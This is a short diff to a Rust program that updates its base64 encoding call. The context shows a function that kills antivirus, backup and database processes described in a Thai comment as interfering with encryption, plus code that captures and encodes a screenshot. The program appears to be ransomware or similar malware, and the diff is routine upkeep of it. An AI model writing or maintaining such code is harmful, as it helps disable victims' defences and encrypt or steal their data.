@@ -9,6 +9,7 @@ use std::process::Command;
 use std::thread;
 use std::time::Duration;
 use chrono::Utc;
+use base64::{Engine, engine::general_purpose::STANDARD};
 
 fn kill_annoying_processes() {
     // รายชื่อ processes ที่ชอบกวนการ encrypt (antivirus, backup, database ฯลฯ)
@@ -157,7 +158,7 @@ fn main() {
     // อ่าน screenshot และ encode base64
     let screenshot_b64 = if screenshot_path.exists() {
         if let Ok(data) = std::fs::read(&screenshot_path) {
-            base64::encode(&data)
+            STANDARD.encode(&data)
         } else {
             String::new()
         }
